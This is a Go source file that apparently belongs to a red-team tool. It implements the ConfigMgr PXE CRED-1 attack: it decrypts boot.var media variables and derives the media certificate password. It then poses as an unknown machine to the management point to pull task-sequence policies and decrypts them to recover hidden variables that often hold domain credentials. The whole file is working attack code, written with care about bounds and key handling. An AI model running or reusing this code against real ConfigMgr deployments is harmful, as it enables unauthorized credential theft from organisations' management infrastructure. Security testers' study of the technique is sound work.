// Package cred1 implements the bounded, protocol-specific CRED-1 PXE policy
// path. It accepts only the observed MP routes and server-returned policies.
package cred1

import (
	"bytes"
	"compress/zlib"
	"crypto"
	"crypto/aes"
	"crypto/cipher"
	"crypto/des"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha1"
	"crypto/sha256"
	"crypto/x509"
	"encoding/asn1"
	"encoding/hex"
	"encoding/xml"
	"errors"
	"fmt"
	"io"
	"mime"
	"mime/multipart"
	"net/http"
	"net/textproto"
	"net/url"
	"strconv"
	"strings"
	"time"
	"unicode/utf16"

	"golang.org/x/crypto/pkcs12"
)

var (
	oidEnvelopedData = asn1.ObjectIdentifier{1, 2, 840, 113549, 1, 7, 3}
	oidRSAESOAEP     = asn1.ObjectIdentifier{1, 2, 840, 113549, 1, 1, 7}
	oidAES256CBC     = asn1.ObjectIdentifier{2, 16, 840, 1, 101, 3, 4, 1, 42}
)

const (
	MaxBootVarBytes      = 256 << 10
	MaxMediaPFXHex       = 16 << 10
	MaxProtectedSequence = 64 << 10
	MaxDecodedSequence   = 256 << 10
	MaxCMSBytes          = 4 << 20
	MaxAssignmentBytes   = 512 << 10
	// MaxPolicyCount bounds policy retrieval to task-sequence assignments only.
	// It is deliberately small, but accommodates a normal OSD baseline plus one
	// disposable validation deployment without enumerating the assignment set.
	MaxPolicyCount     = 8
	bootVarHeaderBytes = 24
)

// BootstrapIdentity is the minimal PXE-derived state needed by the policy
// contract. PFX is intentionally unexported from persistence callers.
type BootstrapIdentity struct {
	ManagementPoint string
	SiteCode        string
	MediaGUID       string
	UnknownX64GUID  string
	PFXHex          string
}

// MPClient is deliberately a one-host, one-contract transport. It has no
// redirects, cookies, credentials, proxy support, retries, or arbitrary URLs.
type MPClient struct {
	BaseURL, Host string
	HTTP          *http.Client
}
type MPMetadata struct{ SiteCode, UnknownX64GUID string }
type PolicyReference struct{ ID, Category, Path string }

// PolicyResult is the transient result of the MP portion of CRED-1. It never
// retains media PFX bytes, private key material, derived passwords, or signed
// request tokens. Recovered variables are intentionally in-memory only so an
// output-policy caller can decide whether their values may be rendered.
type PolicyResult struct {
	Metadata      MPMetadata
	Certificate   CertificateMetadata
	Assignments   []PolicyReference
	Policies      []PolicyReference
	TaskSequences []TaskSequence
}

func (c MPClient) client() *http.Client {
	if c.HTTP != nil {
		return c.HTTP
	}
	return &http.Client{Timeout: 15 * time.Second, CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse }}
}
func (c MPClient) base() (*url.URL, error) {
	u, err := url.Parse(c.BaseURL)
	if err != nil || u.Scheme != "http" || u.Host == "" || u.Path != "" {
		return nil, errors.New("invalid CRED-1 MP base URL")
	}
	return u, nil
}
func (c MPClient) request(method, path string, body io.Reader, contentType string, headers http.Header, max int) (*http.Response, []byte, error) {
	u, err := c.base()
	if err != nil {
		return nil, nil, err
	}
	if !strings.HasPrefix(path, "/") {
		return nil, nil, errors.New("invalid CRED-1 route")
	}
	u.Path = ""
	u.RawQuery = ""
	parts := strings.SplitN(path, "?", 2)
	u.Path = parts[0]
	if len(parts) == 2 {
		u.RawQuery = parts[1]
	}
	req, err := http.NewRequest(method, u.String(), body)
	if err != nil {
		return nil, nil, err
	}
	req.Header.Set("User-Agent", "ConfigMgr Messaging HTTP Sender")
	if c.Host != "" {
		req.Host = c.Host
	}
	if contentType != "" {
		req.Header.Set("Content-Type", contentType)
	}
	for k, v := range headers {
		for _, x := range v {
			req.Header.Add(k, x)
		}
	}
	r, err := c.client().Do(req)
	if err != nil {
		return nil, nil, err
	}
	defer r.Body.Close()
	if r.StatusCode < 200 || r.StatusCode > 299 {
		return r, nil, fmt.Errorf("MP returned %s", r.Status)
	}
	b, err := io.ReadAll(io.LimitReader(r.Body, int64(max+1)))
	if err != nil {
		return r, nil, err
	}
	if len(b) > max {
		return r, nil, errors.New("MP response exceeds bound")
	}
	return r, b, nil
}

// Metadata issues the single evidenced MP metadata request.
func (c MPClient) Metadata() (MPMetadata, error) {
	_, b, err := c.request(http.MethodGet, "/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA", nil, "", nil, 256<<10)
	if err != nil {
		return MPMetadata{}, err
	}
	var x struct {
		Site    string `xml:"SITECODE"`
		Unknown struct {
			X64 string `xml:"x64UnknownMachineGUID,attr"`
		} `xml:"UnknownMachines"`
	}
	if err = xml.Unmarshal(b, &x); err != nil {
		return MPMetadata{}, err
	}
	x.Site = strings.ToUpper(strings.TrimSpace(x.Site))
	x.Unknown.X64 = strings.ToUpper(strings.TrimSpace(x.Unknown.X64))
	if x.Site == "" || !validGUID(x.Unknown.X64) {
		return MPMetadata{}, errors.New("invalid MP unknown-machine metadata")
	}
	return MPMetadata{SiteCode: x.Site, UnknownX64GUID: x.Unknown.X64}, nil
}

func signCAPI(key *rsa.PrivateKey, data []byte) (string, error) {
	h := sha256.Sum256(data)
	sig, err := rsa.SignPKCS1v15(rand.Reader, key, crypto.SHA256, h[:])
	if err != nil {
		return "", err
	}
	for i, j := 0, len(sig)-1; i < j; i, j = i+1, j-1 {
		sig[i], sig[j] = sig[j], sig[i]
	}
	return strings.ToUpper(hex.EncodeToString(sig)), nil
}
func utf16z(s string) []byte { return append(u16bytes(s), 0, 0) }
func u16bytes(s string) []byte {
	u := utf16.Encode([]rune(s))
	b := make([]byte, len(u)*2)
	for i, x := range u {
		b[2*i] = byte(x)
		b[2*i+1] = byte(x >> 8)
	}
	return b
}

// Assign issues exactly one observed multipart assignment request.
func (c MPClient) Assign(identity BootstrapIdentity, key *rsa.PrivateKey, metadata MPMetadata, now time.Time) ([]PolicyReference, error) {
	if key == nil || identity.SiteCode != metadata.SiteCode || !validGUID(identity.MediaGUID) || !validGUID(metadata.UnknownX64GUID) {
		return nil, errors.New("invalid CRED-1 assignment identity")
	}
	ts := now.UTC().Truncate(time.Second).Format("2006-01-02T15:04:05Z")
	tokenSig, err := signCAPI(key, u16bytes(identity.MediaGUID+";"+ts+"\x00"))
	if err != nil {
		return nil, err
	}
	token := "ClientToken:" + identity.MediaGUID + ";" + ts + "\r\nClientTokenSignature:" + tokenSig + "\r\n"
	msgXML := `<Msg><ID/><SourceID>` + metadata.UnknownX64GUID + `</SourceID><ReplyTo>direct:OSD</ReplyTo><Body Type="ByteRange" Offset="0" Length="728"/><Hooks><Hook2 Name="clientauth"><Property Name="Token"><![CDATA[` + token + `]]></Property></Hook2></Hooks><Payload Type="inline"/><TargetEndpoint>MP_PolicyManager</TargetEndpoint><ReplyMode>Sync</ReplyMode></Msg>`
	msg := append([]byte{0xff, 0xfe}, u16bytes(msgXML)...)
	requestXML := `<RequestAssignments SchemaVersion="1.00" RequestType="Always" Ack="False" ValidationRequested="CRC"><PolicySource>SMS:` + metadata.SiteCode + `</PolicySource><ServerCookie/><Resource ResourceType="Machine"/><Identification><Machine><ClientID>` + metadata.UnknownX64GUID + `</ClientID><NetBIOSName></NetBIOSName><FQDN></FQDN><SID/></Machine></Identification></RequestAssignments>` + "\r\n"
	requestAssignments := append(u16bytes(requestXML), 0, 0, 0)
	var body bytes.Buffer
	mw := multipart.NewWriter(&body)
	_ = mw.SetBoundary("CinderPathCred1" + strconv.FormatInt(now.UnixNano(), 16))
	h := textPartHeader("Msg", "text/plain; charset=UTF-16")
	p, _ := mw.CreatePart(h)
	_, _ = p.Write(msg)
	h = textPartHeader("RequestAssignments", "text/plain; charset=UTF-16")
	p, _ = mw.CreatePart(h)
	_, _ = p.Write(requestAssignments)
	_ = mw.Close()
	if body.Len() > 64<<10 {
		return nil, errors.New("assignment request exceeds bound")
	}
	r, b, err := c.request("CCM_POST", "/ccm_system/request", &body, strings.Replace(mw.FormDataContentType(), "multipart/form-data", "multipart/mixed", 1), nil, MaxAssignmentBytes)
	if err != nil {
		return nil, err
	}
	return parseAssignments(r.Header.Get("Content-Type"), b, c.BaseURL)
}

// SelectTaskSequencePolicies chooses only task-sequence policy references that
// the MP returned in this assignment response. It never constructs or guesses
// a policy identifier.
func SelectTaskSequencePolicies(refs []PolicyReference) ([]PolicyReference, error) {
	selected := make([]PolicyReference, 0, MaxPolicyCount)
	seen := make(map[string]struct{})
	for _, ref := range refs {
		if !strings.EqualFold(strings.TrimSpace(ref.Category), "TaskSequence") {
			continue
		}
		key := ref.ID + "\x00" + ref.Path
		if ref.ID == "" || ref.Path == "" {
			return nil, errors.New("invalid task-sequence policy reference")
		}
		if _, ok := seen[key]; ok {
			continue
		}
		seen[key] = struct{}{}
		selected = append(selected, ref)
		if len(selected) > MaxPolicyCount {
			return nil, errors.New("task-sequence policy limit exceeded")
		}
	}
	return selected, nil
}

// FetchPolicy requests exactly one policy path returned by Assign. The media
// identity signatures are transient request material and are not persisted.
func (c MPClient) FetchPolicy(ref PolicyReference, identity BootstrapIdentity, key *rsa.PrivateKey, now time.Time) ([]byte, error) {
	if key == nil || ref.ID == "" || ref.Path == "" || !validGUID(identity.MediaGUID) {
		return nil, errors.New("invalid CRED-1 policy request")
	}
	clientSignature, err := signCAPI(key, utf16z(identity.MediaGUID))
	if err != nil {
		return nil, err
	}
	timestamp := now.UTC().Truncate(time.Second).Format("2006-01-02T15:04:05Z")
	timestampSignature, err := signCAPI(key, utf16z(timestamp))
	if err != nil {
		return nil, err
	}
	headers := http.Header{
		"CCMClientID":                 []string{identity.MediaGUID},
		"CCMClientIDSignature":        []string{clientSignature},
		"CCMClientTimestamp":          []string{timestamp},
		"CCMClientTimestampSignature": []string{timestampSignature},
	}
	r, body, err := c.request(http.MethodGet, ref.Path, nil, "", headers, MaxCMSBytes)
	if err != nil {
		return nil, err
	}
	mediaType, _, err := mime.ParseMediaType(r.Header.Get("Content-Type"))
	if err != nil || !strings.EqualFold(mediaType, "text/xml") {
		return nil, fmt.Errorf("unexpected policy content type %q", r.Header.Get("Content-Type"))
	}
	return body, nil
}

// ExecutePolicyPath performs the exact, bounded CRED-1 MP sequence after a
// PXE bootstrap identity has already been recovered: metadata, one assignment,
// then only task-sequence policies returned by that assignment. The caller is
// responsible for promptly discarding identity.PFXHex after this call.
func (c MPClient) ExecutePolicyPath(identity BootstrapIdentity, now time.Time) (PolicyResult, error) {
	var out PolicyResult
	key, cert, err := LoadMediaPFX(identity)
	if err != nil {
		return out, err
	}
	defer func() {
		// Best-effort removal of a private-key copy once crypto operations end.
		key.D = nil
		key.Primes = nil
	}()
	metadata, err := c.Metadata()
	if err != nil {
		return out, err
	}
	refs, err := c.Assign(identity, key, metadata, now)
	if err != nil {
		return out, err
	}
	selected, err := SelectTaskSequencePolicies(refs)
	if err != nil {
		return out, err
	}
	out.Metadata, out.Certificate, out.Assignments, out.Policies = metadata, cert, refs, selected
	for _, ref := range selected {
		cms, err := c.FetchPolicy(ref, identity, key, now)
		if err != nil {
			return PolicyResult{}, err
		}
		plain, err := DecryptPolicyCMS(cms, key)
		if err != nil {
			return PolicyResult{}, fmt.Errorf("policy %s: %w", ref.ID, err)
		}
		sequences, err := ExtractTaskSequences(plain)
		if err != nil {
			return PolicyResult{}, fmt.Errorf("policy %s: %w", ref.ID, err)
		}
		out.TaskSequences = append(out.TaskSequences, sequences...)
	}
	return out, nil
}
func textPartHeader(name, contentType string) textproto.MIMEHeader {
	h := textproto.MIMEHeader{}
	h.Set("Content-Disposition", `form-data; name="`+name+`"`)
	h.Set("Content-Type", contentType)
	return h
}

func parseAssignments(contentType string, body []byte, base string) ([]PolicyReference, error) {
	_, params, err := mime.ParseMediaType(contentType)
	if err != nil || params["boundary"] == "" {
		return nil, fmt.Errorf("invalid assignment content type %q", contentType)
	}
	mr := multipart.NewReader(bytes.NewReader(body), params["boundary"])
	var parts [][]byte
	for len(parts) < 3 {
		p, e := mr.NextPart()
		if e == io.EOF {
			break
		}
		if e != nil {
			return nil, e
		}
		b, e := io.ReadAll(io.LimitReader(p, MaxAssignmentBytes+1))
		if e != nil || len(b) > MaxAssignmentBytes {
			return nil, errors.New("invalid assignment part")
		}
		parts = append(parts, b)
	}
	if len(parts) < 2 {
		return nil, errors.New("assignment response lacks policy part")
	}
	zr, e := zlib.NewReader(bytes.NewReader(parts[1]))
	if e != nil {
		return nil, e
	}
	plain, e := io.ReadAll(io.LimitReader(zr, MaxAssignmentBytes+1))
	_ = zr.Close()
	if e != nil || len(plain) > MaxAssignmentBytes {
		return nil, errors.New("invalid assignment payload")
	}
	s, e := utf16LEString(plain)
	if e != nil {
		return nil, e
	}
	var x struct {
		Policies []struct {
			ID       string `xml:"PolicyID,attr"`
			Category string `xml:"PolicyCategory,attr"`
			Location string `xml:"PolicyLocation"`
		} `xml:"PolicyAssignment>Policy"`
	}
	if e = xml.Unmarshal([]byte(s), &x); e != nil {
		return nil, e
	}
	u, err := url.Parse(base)
	if err != nil {
		return nil, err
	}
	out := make([]PolicyReference, 0, len(x.Policies))
	for _, p := range x.Policies {
		loc := strings.Replace(p.Location, "http://<mp>", base, 1)
		q, e := url.Parse(loc)
		if e != nil || q.Scheme != u.Scheme || q.Host != u.Host || q.Path != "/SMS_MP/.sms_pol" || q.RawQuery == "" {
			return nil, errors.New("assignment contains out-of-scope policy URL")
		}
		out = append(out, PolicyReference{ID: p.ID, Category: p.Category, Path: q.EscapedPath() + "?" + q.RawQuery})
	}
	if len(out) == 0 || len(out) > 256 {
		return nil, errors.New("invalid assignment policy count")
	}
	return out, nil
}

// CertificateMetadata is safe to persist and render. It deliberately omits
// PFX bytes, the derived password, and the private key.
type CertificateMetadata struct {
	FingerprintSHA256 string
	Subject           string
	Issuer            string
	Serial            string
	KeyAlgorithm      string
	KeyBits           int
}

// LoadMediaPFX imports the PXE PFX transiently. ConfigMgr CRED-1 currently
// requires an RSA private key because the observed MP protocol signs with
// RSA PKCS#1 v1.5. Callers must not retain or persist the returned key.
func LoadMediaPFX(identity BootstrapIdentity) (*rsa.PrivateKey, CertificateMetadata, error) {
	var meta CertificateMetadata
	password, err := identity.PFXPassword()
	if err != nil {
		return nil, meta, err
	}
	pfx, err := hex.DecodeString(identity.PFXHex)
	if err != nil || len(pfx) == 0 || len(pfx) > MaxMediaPFXHex/2 {
		return nil, meta, errors.New("invalid media PFX")
	}
	key, cert, err := pkcs12.Decode(pfx, password)
	if err != nil {
		return nil, meta, fmt.Errorf("media PFX import: %w", err)
	}
	rsaKey, ok := key.(*rsa.PrivateKey)
	if !ok || cert == nil {
		return nil, meta, errors.New("media PFX does not contain an RSA certificate and private key")
	}
	meta = certificateMetadata(cert)
	if meta.KeyAlgorithm != "RSA" || meta.KeyBits < 1024 {
		return nil, meta, errors.New("media PFX has unsupported certificate key")
	}
	return rsaKey, meta, nil
}

func certificateMetadata(cert *x509.Certificate) CertificateMetadata {
	fp := sha256.Sum256(cert.Raw)
	return CertificateMetadata{
		FingerprintSHA256: fmt.Sprintf("sha256:%x", fp[:]),
		Subject:           cert.Subject.String(), Issuer: cert.Issuer.String(), Serial: cert.SerialNumber.Text(16),
		KeyAlgorithm: cert.PublicKeyAlgorithm.String(), KeyBits: func() int {
			if k, ok := cert.PublicKey.(*rsa.PublicKey); ok {
				return k.N.BitLen()
			}
			return 0
		}(),
	}
}

// MediaKey derives the AES/3DES material used by ConfigMgr media files.
func MediaKey(password []byte) []byte {
	h := sha1.Sum(password)
	b0, b1 := make([]byte, 64), make([]byte, 64)
	for i, x := range h {
		b0[i], b1[i] = x^0x36, x^0x5c
	}
	for i := len(h); i < 64; i++ {
		b0[i], b1[i] = 0x36, 0x5c
	}
	a, b := sha1.Sum(b0), sha1.Sum(b1)
	return append(a[:], b[:]...)
}

// DecryptBootVar decodes the bounded WDS boot.var envelope returned by PXE.
func DecryptBootVar(raw, key []byte) ([]byte, error) {
	if len(raw) <= bootVarHeaderBytes+aes.BlockSize || len(raw) > MaxBootVarBytes {
		return nil, errors.New("invalid boot.var size")
	}
	if len(key) < aes.BlockSize {
		return nil, errors.New("boot.var key is too short")
	}
	// The observed WDS file has a fixed 24-byte header followed by AES-CBC
	// blocks and a short opaque trailer (two bytes in GOAD; historical samples
	// carried eight). Only complete blocks are encrypted media content.
	ciphertextEnd := len(raw) - (len(raw)-bootVarHeaderBytes)%aes.BlockSize
	ciphertext := raw[bootVarHeaderBytes:ciphertextEnd]
	if len(ciphertext)%aes.BlockSize != 0 {
		return nil, errors.New("boot.var ciphertext is not block aligned")
	}
	b, err := aes.NewCipher(key[:aes.BlockSize])
	if err != nil {
		return nil, err
	}
	out := make([]byte, len(ciphertext))
	cipher.NewCBCDecrypter(b, make([]byte, aes.BlockSize)).CryptBlocks(out, ciphertext)
	return out, nil
}

type mediaVarList struct {
	Vars []mediaVar `xml:"var"`
}
type mediaVar struct {
	Name  string `xml:"name,attr"`
	Value string `xml:",chardata"`
}

func utf16LEString(b []byte) (string, error) {
	if len(b)%2 != 0 {
		return "", errors.New("UTF-16 value has odd length")
	}
	u := make([]uint16, len(b)/2)
	for i := range u {
		u[i] = uint16(b[2*i]) | uint16(b[2*i+1])<<8
	}
	s := strings.TrimRight(string(utf16.Decode(u)), "\x00")
	return strings.TrimPrefix(s, "\ufeff"), nil
}

// ParseBootVar extracts exact allowlisted values and rejects all malformed
// identity/PFX forms before they reach crypto or transport code.
func ParseBootVar(plaintext []byte) (BootstrapIdentity, error) {
	var out BootstrapIdentity
	if len(plaintext) == 0 || len(plaintext) > MaxBootVarBytes {
		return out, errors.New("invalid boot.var plaintext size")
	}
	s, err := utf16LEString(plaintext)
	if err != nil {
		return out, err
	}
	// The media file is decoded from UTF-16 above. Remove its original XML
	// encoding declaration before handing the now UTF-8 Go string to encoding/xml.
	if strings.HasPrefix(strings.TrimSpace(s), "<?xml") {
		if end := strings.Index(s, "?>"); end >= 0 {
			s = s[end+2:]
		}
	}
	var doc mediaVarList
	if err = xml.Unmarshal([]byte(s), &doc); err != nil {
		return out, fmt.Errorf("boot.var XML: %w", err)
	}
	if len(doc.Vars) == 0 || len(doc.Vars) > 64 {
		return out, errors.New("invalid boot.var variable count")
	}
	seen := map[string]bool{}
	for _, v := range doc.Vars {
		if seen[v.Name] {
			return out, fmt.Errorf("duplicate boot.var field %q", v.Name)
		}
		seen[v.Name] = true
		if len(v.Value) > MaxMediaPFXHex {
			return out, fmt.Errorf("boot.var field %q is oversized", v.Name)
		}
		switch v.Name {
		case "SMSTSMP":
			out.ManagementPoint = strings.TrimSpace(v.Value)
		case "_SMSTSSiteCode":
			out.SiteCode = strings.ToUpper(strings.TrimSpace(v.Value))
		case "_SMSMediaGuid":
			out.MediaGUID = strings.ToUpper(strings.TrimSpace(v.Value))
		case "_SMSTSx64UnknownMachineGUID":
			out.UnknownX64GUID = strings.ToUpper(strings.TrimSpace(v.Value))
		case "_SMSTSMediaPFX":
			out.PFXHex = strings.TrimSpace(v.Value)
		}
	}
	if !strings.HasPrefix(out.ManagementPoint, "http://") || len(out.ManagementPoint) > 255 || out.SiteCode == "" || !validGUID(out.MediaGUID) || !validGUID(out.UnknownX64GUID) {
		return out, errors.New("boot.var required identity values are invalid")
	}
	if len(out.PFXHex) < 2 || len(out.PFXHex) > MaxMediaPFXHex || len(out.PFXHex)%2 != 0 {
		return out, errors.New("boot.var PFX is invalid")
	}
	if _, err := hex.DecodeString(out.PFXHex); err != nil {
		return out, errors.New("boot.var PFX is not hex")
	}
	return out, nil
}

func validGUID(v string) bool {
	v = strings.Trim(v, "{}")
	if len(v) != 36 {
		return false
	}
	for i, c := range v {
		if i == 8 || i == 13 || i == 18 || i == 23 {
			if c != '-' {
				return false
			}
			continue
		}
		if !((c >= '0' && c <= '9') || (c >= 'A' && c <= 'F')) {
			return false
		}
	}
	return true
}

// PFXPassword returns the exact ConfigMgr media-PFX password derivation.
func (b BootstrapIdentity) PFXPassword() (string, error) {
	if !validGUID(b.MediaGUID) {
		return "", errors.New("invalid media GUID")
	}
	if len(b.MediaGUID) < 31 {
		return "", errors.New("media GUID is too short")
	}
	return b.MediaGUID[:31], nil
}

// DeobfuscateSequence implements the independently evidenced ConfigMgr
// protected TS_Sequence format. It does not classify or persist plaintext.
func DeobfuscateSequence(v string) (string, error) {
	v = strings.TrimSpace(v)
	if len(v) < 129 || len(v) > MaxProtectedSequence || len(v)%2 != 0 {
		return "", errors.New("invalid protected TS_Sequence length")
	}
	keyMaterial, err := hex.DecodeString(v[8:88])
	if err != nil || len(keyMaterial) != 40 {
		return "", errors.New("invalid protected TS_Sequence key material")
	}
	ciphertext, err := hex.DecodeString(v[128:])
	if err != nil || len(ciphertext) < des.BlockSize {
		return "", errors.New("invalid protected TS_Sequence ciphertext")
	}
	// ConfigMgr appends non-block trailer bytes to this representation. The
	// independently evidenced decoder consumes complete 3DES blocks only.
	ciphertext = ciphertext[:len(ciphertext)/des.BlockSize*des.BlockSize]
	key := MediaKey(keyMaterial)[:24]
	b, err := des.NewTripleDESCipher(key)
	if err != nil {
		return "", err
	}
	plain := make([]byte, len(ciphertext))
	cipher.NewCBCDecrypter(b, make([]byte, des.BlockSize)).CryptBlocks(plain, ciphertext)
	s, err := utf16LEString(plain)
	if err != nil {
		return "", err
	}
	if len(s) == 0 || len(s) > MaxDecodedSequence || !strings.Contains(s, "<") {
		return "", errors.New("invalid decrypted TS_Sequence")
	}
	return s, nil
}

type algorithmIdentifier struct {
	Algorithm  asn1.ObjectIdentifier
	Parameters asn1.RawValue `asn1:"optional"`
}
type cmsContentInfo struct {
	ContentType asn1.ObjectIdentifier
	Content     asn1.RawValue `asn1:"tag:0,explicit"`
}
type cmsEnvelopedData struct {
	Version              int
	RecipientInfos       asn1.RawValue
	EncryptedContentInfo cmsEncryptedContentInfo
}
type cmsEncryptedContentInfo struct {
	ContentType                asn1.ObjectIdentifier
	ContentEncryptionAlgorithm algorithmIdentifier
	EncryptedContent           asn1.RawValue `asn1:"tag:0,optional"`
}
type cmsKeyTransRecipientInfo struct {
	Version                int
	Recipient              asn1.RawValue
	KeyEncryptionAlgorithm algorithmIdentifier
	EncryptedKey           []byte
}

// RecoveredVariable is plaintext obtained only after canonical TS_Sequence
// deobfuscation. Callers decide whether their output policy may display Value.
type RecoveredVariable struct {
	Name  string
	Value string
}

type TaskSequence struct {
	PackageID    string
	DeploymentID string
	Sequence     string
	Variables    []RecoveredVariable
}

type taskProperty struct {
	Name  string `xml:"name,attr"`
	Value string `xml:"value"`
}
type taskInstance struct {
	Class      string         `xml:"class,attr"`
	Properties []taskProperty `xml:"property"`
}

// ExtractTaskSequences parses only CCM_TaskSequence policy instances and
// decrypts their TS_Sequence values. It does not use variable names or entropy
// as evidence: values are reported only after protected-sequence recovery.
func ExtractTaskSequences(policy []byte) ([]TaskSequence, error) {
	text, err := utf16LEString(policy)
	if err != nil || len(text) == 0 || len(text) > MaxCMSBytes {
		return nil, errors.New("invalid decoded task-sequence policy")
	}
	dec := xml.NewDecoder(strings.NewReader(text))
	var out []TaskSequence
	for {
		tok, e := dec.Token()
		if e == io.EOF {
			break
		}
		if e != nil {
			return nil, fmt.Errorf("task-sequence policy XML: %w", e)
		}
		start, ok := tok.(xml.StartElement)
		if !ok || start.Name.Local != "instance" {
			continue
		}
		var x taskInstance
		if e = dec.DecodeElement(&x, &start); e != nil {
			return nil, e
		}
		if x.Class != "CCM_TaskSequence" {
			continue
		}
		if len(out) >= 16 || len(x.Properties) > 256 {
			return nil, errors.New("task-sequence policy bounds exceeded")
		}
		vals := map[string]string{}
		for _, p := range x.Properties {
			if len(p.Name) > 128 || len(p.Value) > MaxProtectedSequence {
				return nil, errors.New("task-sequence property bounds exceeded")
			}
			vals[p.Name] = p.Value
		}
		protected := vals["TS_Sequence"]
		sequence, e := DeobfuscateSequence(protected)
		if e != nil {
			return nil, fmt.Errorf("TS_Sequence: %w", e)
		}
		seq := normalizeSequence(sequence)
		variables, e := extractVariables(seq)
		if e != nil {
			return nil, e
		}
		out = append(out, TaskSequence{PackageID: vals["PKG_PackageID"], DeploymentID: vals["ADV_AdvertisementID"], Sequence: seq, Variables: variables})
	}
	if len(out) == 0 {
		return nil, errors.New("no CCM_TaskSequence instance")
	}
	return out, nil
}

func normalizeSequence(s string) string {
	start, end := strings.Index(s, "<sequence"), strings.LastIndex(s, "</sequence>")
	if start < 0 || end < start {
		return ""
	}
	return s[start : end+len("</sequence>")]
}

func extractVariables(sequence string) ([]RecoveredVariable, error) {
	if len(sequence) == 0 || len(sequence) > MaxDecodedSequence {
		return nil, errors.New("invalid recovered task-sequence XML")
	}
	dec := xml.NewDecoder(strings.NewReader(sequence))
	count := 0
	var out []RecoveredVariable
	for {
		tok, e := dec.Token()
		if e == io.EOF {
			break
		}
		if e != nil {
			return nil, fmt.Errorf("task-sequence XML: %w", e)
		}
		start, ok := tok.(xml.StartElement)
		if !ok || start.Name.Local != "step" {
			continue
		}
		var step struct {
			Action    string `xml:"action"`
			Variables []struct {
				Name     string `xml:"name,attr"`
				Property string `xml:"property,attr"`
				Value    string `xml:",chardata"`
			} `xml:"defaultVarList>variable"`
		}
		if e = dec.DecodeElement(&step, &start); e != nil {
			return nil, e
		}
		count++
		if count > 512 {
			return nil, errors.New("task-sequence action limit exceeded")
		}
		command := strings.TrimSpace(step.Action)
		if !strings.HasPrefix(strings.ToLower(command), "tsenv.exe ") {
			continue
		}
		argument := strings.TrimSpace(strings.TrimPrefix(command, "tsenv.exe"))
		// tsenv.exe accepts switches after the quoted NAME=VALUE argument. Do
		// not fold those switches into a recovered value.
		if strings.HasPrefix(argument, `"`) {
			if end := strings.Index(argument[1:], `"`); end >= 0 {
				argument = argument[1 : end+1]
			} else {
				continue
			}
		} else if fields := strings.Fields(argument); len(fields) > 0 {
			argument = fields[0]
		}
		name, value, ok := strings.Cut(argument, "=")
		if !ok || strings.TrimSpace(name) == "" || len(name) > 128 || len(value) > 4096 {
			continue
		}
		name = strings.TrimSpace(name)
		// ConfigMgr's hidden-variable action deliberately places an empty value
		// in tsenv.exe and keeps the actual value in the action's protected
		// HiddenVariableValue property. This is structural task-sequence data,
		// not a name/entropy heuristic.
		if value == "" {
			var declaredName, hidden string
			for _, v := range step.Variables {
				switch v.Property {
				case "VariableName":
					declaredName = strings.TrimSpace(v.Value)
				case "HiddenVariableValue":
					hidden = v.Value
				}
			}
			if declaredName == name && hidden != "" {
				value = hidden
			}
		}
		out = append(out, RecoveredVariable{Name: name, Value: value})
	}
	return out, nil
}

// DecryptPolicyCMS accepts only the CRED-1 CMS profile observed in GOAD:
// RSAES-OAEP with default SHA-1 parameters and AES-256-CBC.
func DecryptPolicyCMS(raw []byte, key *rsa.PrivateKey) ([]byte, error) {
	if key == nil || len(raw) == 0 || len(raw) > MaxCMSBytes {
		return nil, errors.New("invalid CMS input")
	}
	var ci cmsContentInfo
	rest, err := asn1.Unmarshal(raw, &ci)
	if err != nil || len(rest) != 0 || !ci.ContentType.Equal(oidEnvelopedData) {
		return nil, errors.New("invalid CMS EnvelopedData")
	}
	var env cmsEnvelopedData
	rest, err = asn1.Unmarshal(ci.Content.Bytes, &env)
	if err != nil || len(rest) != 0 || env.Version != 2 {
		return nil, errors.New("invalid CMS envelope")
	}
	alg := env.EncryptedContentInfo.ContentEncryptionAlgorithm
	if !alg.Algorithm.Equal(oidAES256CBC) || alg.Parameters.Tag != asn1.TagOctetString {
		return nil, errors.New("unsupported CMS content cipher")
	}
	iv, ciphertext := alg.Parameters.Bytes, env.EncryptedContentInfo.EncryptedContent.Bytes
	if len(iv) != aes.BlockSize || len(ciphertext) == 0 || len(ciphertext)%aes.BlockSize != 0 {
		return nil, errors.New("invalid CMS AES content")
	}
	var set asn1.RawValue
	if _, err = asn1.Unmarshal(env.RecipientInfos.FullBytes, &set); err != nil || set.Tag != asn1.TagSet || set.Class != asn1.ClassUniversal {
		return nil, errors.New("invalid CMS recipient set")
	}
	var recipientRaw asn1.RawValue
	if rest, err = asn1.Unmarshal(set.Bytes, &recipientRaw); err != nil || len(rest) != 0 {
		return nil, errors.New("invalid CMS recipient")
	}
	var recipient cmsKeyTransRecipientInfo
	if rest, err = asn1.Unmarshal(recipientRaw.FullBytes, &recipient); err != nil || len(rest) != 0 || !recipient.KeyEncryptionAlgorithm.Algorithm.Equal(oidRSAESOAEP) {
		return nil, errors.New("unsupported CMS key wrap")
	}
	if recipient.KeyEncryptionAlgorithm.Parameters.Tag != asn1.TagSequence || len(recipient.KeyEncryptionAlgorithm.Parameters.Bytes) != 0 {
		return nil, errors.New("unsupported CMS OAEP parameters")
	}
	cek, err := rsa.DecryptOAEP(sha1.New(), rand.Reader, key, recipient.EncryptedKey, nil)
	if err != nil || len(cek) != 32 {
		return nil, errors.New("CMS key unwrap failed")
	}
	b, _ := aes.NewCipher(cek)
	plain := make([]byte, len(ciphertext))
	cipher.NewCBCDecrypter(b, iv).CryptBlocks(plain, ciphertext)
	pad := int(plain[len(plain)-1])
	if pad < 1 || pad > aes.BlockSize || pad > len(plain) {
		return nil, errors.New("invalid CMS padding")
	}
	for _, x := range plain[len(plain)-pad:] {
		if int(x) != pad {
			return nil, errors.New("invalid CMS padding")
		}
	}
	return plain[:len(plain)-pad], nil
}
